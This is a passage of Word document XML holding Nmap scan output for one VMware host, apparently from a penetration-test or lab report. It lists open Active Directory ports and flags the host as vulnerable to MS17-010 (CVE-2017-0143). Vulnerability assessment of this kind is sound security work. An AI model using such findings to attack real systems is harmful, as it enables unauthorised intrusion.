        <w:t>|_clamav-exec: ERROR: Script execution failed (use -d to debug)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D900334" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t xml:space="preserve">464/tcp   </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>open  kpasswd</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>5</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="78D7C35F" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>|_clamav-exec: ERROR: Script execution failed (use -d to debug)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="086EF96B" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t xml:space="preserve">593/tcp   </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>open  http</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>-rpc-epmap</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2463328C" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>|_clamav-exec: ERROR: Script execution failed (use -d to debug)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C96F2F0" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t xml:space="preserve">636/tcp   </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>open  ldapssl</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="15F29F02" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>|_clamav-exec: ERROR: Script execution failed (use -d to debug)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17CABD96" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t xml:space="preserve">|_sslv2-drown: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57D7DD43" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>3268/</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>tcp  open</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t xml:space="preserve">  globalcatLDAP</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F502EE8" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>|_clamav-exec: ERROR: Script execution failed (use -d to debug)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12242C69" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>3269/</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>tcp  open</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t xml:space="preserve">  globalcatLDAPssl</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10C87F7B" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>|_clamav-exec: ERROR: Script execution failed (use -d to debug)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76CF4229" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t xml:space="preserve">|_sslv2-drown: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="082A0CBE" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t xml:space="preserve">49152/tcp </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>open  unknown</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="50379397" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>|_clamav-exec: ERROR: Script execution failed (use -d to debug)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F25D507" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t xml:space="preserve">49153/tcp </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>open  unknown</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="696A7131" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>|_clamav-exec: ERROR: Script execution failed (use -d to debug)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33854430" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t xml:space="preserve">49154/tcp </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>open  unknown</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="1A95A1AF" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>|_clamav-exec: ERROR: Script execution failed (use -d to debug)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79686B8C" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t xml:space="preserve">49155/tcp </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>open  unknown</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="35F2C3CF" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>|_clamav-exec: ERROR: Script execution failed (use -d to debug)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3D4EB00B" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t xml:space="preserve">49157/tcp </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>open  unknown</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="0EC479A7" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>|_clamav-exec: ERROR: Script execution failed (use -d to debug)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="227BC579" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t xml:space="preserve">49158/tcp </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>open  unknown</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="01538994" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>|_clamav-exec: ERROR: Script execution failed (use -d to debug)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CD1A557" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t xml:space="preserve">49159/tcp </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>open  unknown</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="11C0EBC0" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>|_clamav-exec: ERROR: Script execution failed (use -d to debug)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3120EE68" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t xml:space="preserve">49163/tcp </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>open  unknown</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="5766D476" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>|_clamav-exec: ERROR: Script execution failed (use -d to debug)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1EF1940D" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t xml:space="preserve">49167/tcp </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>open  unknown</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="34C980C1" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>|_clamav-exec: ERROR: Script execution failed (use -d to debug)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="315D3146" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>MAC Address: 00:0</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>C:29:77:67</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>:D6 (VMware)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F381701" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="05D773A2" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>Host script results:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="357BC167" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>|_smb-vuln-ms10-054: false</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67B7650E" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>|_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01ACC5B9" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t xml:space="preserve">| smb-vuln-ms17-010: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C29F271" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>|   VULNERABLE:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5046C7A6" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4665F9AE" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>|     State: VULNERABLE</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="512861E6" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t xml:space="preserve">|     IDs:  </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>CVE:CVE</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>-2017-0143</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="15409EA8" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>|     Risk factor: HIGH</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B134E4C" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>|       A critical remote code execution vulnerability exists in Microsoft SMBv1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EAFAD72" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>|        servers (ms17-010).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="149DE7BA" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t xml:space="preserve">|           </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08CF80F9" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>|     Disclosure date: 2017-03-14</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B937EFD" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>|     References:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="047B8209" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>|       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="113849BF" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>|       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3771D9E3" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25C0A778" w14:textId="77777777" w:rsidR="007077E7" w:rsidRPr="00C97712" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6AE55D70" w14:textId="77777777" w:rsidR="007077E7" w:rsidRDefault="007077E7" w:rsidP="007077E7">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00C97712">
        <w:rPr>
          <w:sz w:val="12"/>
        </w:rPr>
        <w:t>Nmap done: 1 IP address (1 host up) scanned in 205.97 seconds</w:t>
      </w:r>
    </w:p>
